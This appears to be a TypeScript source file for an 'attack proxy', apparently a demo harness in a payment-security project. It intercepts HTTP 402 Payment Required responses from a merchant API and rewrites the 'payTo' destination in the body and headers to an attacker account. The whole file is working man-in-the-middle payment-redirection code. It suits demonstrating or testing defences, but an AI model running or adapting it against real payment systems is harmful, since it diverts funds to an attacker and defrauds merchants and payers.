import Fastify from 'fastify';
import { createLogger } from '@quoteseal/shared';

const logger = createLogger('AttackProxy');
const server = Fastify();

const TARGET_URL = process.env.MERCHANT_API_URL || 'http://localhost:3001';
const ATTACKER_PAY_TO = process.env.ATTACKER_PAY_TO || '0.0.66666';
const PORT = parseInt(process.env.ATTACK_PROXY_PORT || '3002', 10);

let attackEnabled = true;
let interceptedCount = 0;

server.get('/health', async () => {
  return { status: 'ok', proxy: 'attack-proxy', attackEnabled, interceptedCount };
});

server.post('/toggle-attack', async (request) => {
  const body = (request.body as { enabled?: boolean }) || {};
  if (typeof body.enabled === 'boolean') {
    attackEnabled = body.enabled;
  } else {
    attackEnabled = !attackEnabled;
  }
  logger.warn(`Attack mode toggled: ${attackEnabled ? 'ENABLED (Rewriting payTo)' : 'DISABLED (Pass-through)'}`);
  return { attackEnabled };
});

// Intercept and proxy all incoming requests to the target merchant API
server.all('/*', async (request, reply) => {
  const targetEndpoint = `${TARGET_URL}${request.url}`;
  logger.info(`Proxying ${request.method} ${request.url} -> ${targetEndpoint}`);

  try {
    const upstreamHeaders: Record<string, string> = {};
    for (const [k, v] of Object.entries(request.headers)) {
      if (v && k !== 'host' && k !== 'content-length') {
        upstreamHeaders[k] = Array.isArray(v) ? v.join(',') : v;
      }
    }

    const upstreamResponse = await fetch(targetEndpoint, {
      method: request.method,
      headers: upstreamHeaders,
      body: ['POST', 'PUT', 'PATCH'].includes(request.method) ? JSON.stringify(request.body) : undefined,
    });

    const statusCode = upstreamResponse.status;
    const responseHeaders = Object.fromEntries(upstreamResponse.headers.entries());

    // Intercept 402 Payment Required
    if (statusCode === 402 && attackEnabled) {
      interceptedCount++;
      logger.warn(`[ATTACK TRIGGERED] Intercepted 402 Payment Required! Rewriting payTo -> ${ATTACKER_PAY_TO}`);

      const bodyText = await upstreamResponse.text();
      let modifiedBodyText = bodyText;

      try {
        const bodyJson = JSON.parse(bodyText);
        if (bodyJson.payment && bodyJson.payment.payTo) {
          logger.info(`Original payTo: ${bodyJson.payment.payTo} => Substituted: ${ATTACKER_PAY_TO}`);
          bodyJson.payment.payTo = ATTACKER_PAY_TO;
          modifiedBodyText = JSON.stringify(bodyJson);
        }
      } catch {
        // Fallback regex replacement
        modifiedBodyText = bodyText.replace(/"payTo"\s*:\s*"[^"]+"/g, `"payTo":"${ATTACKER_PAY_TO}"`);
      }

      // Also rewrite payment-required header if present
      if (responseHeaders['payment-required']) {
        try {
          const headerJson = JSON.parse(responseHeaders['payment-required']);
          headerJson.payTo = ATTACKER_PAY_TO;
          responseHeaders['payment-required'] = JSON.stringify(headerJson);
        } catch {
          // ignore header parse error
        }
      }

      for (const [k, v] of Object.entries(responseHeaders)) {
        if (k !== 'content-length') {
          reply.header(k, v);
        }
      }

      return reply.code(402).send(modifiedBodyText);
    }

    // Normal pass-through
    const responseBody = await upstreamResponse.text();
    for (const [k, v] of Object.entries(responseHeaders)) {
      if (k !== 'content-length') {
        reply.header(k, v);
      }
    }
    return reply.code(statusCode).send(responseBody);
  } catch (err: unknown) {
    logger.error(`Proxy forwarding error: ${(err as Error).message}`);
    return reply.code(502).send({ error: 'Bad Gateway', details: (err as Error).message });
  }
});

export async function startAttackProxy(port = PORT) {
  await server.listen({ port, host: '0.0.0.0' });
  logger.info(`Attack Proxy listening on http://localhost:${port} (Targeting: ${TARGET_URL})`);
  return server;
}

if (process.env.NODE_ENV !== 'test') {
  startAttackProxy().catch((err) => {
    logger.error(`Failed to start attack proxy: ${err.message}`);
    process.exit(1);
  });
}
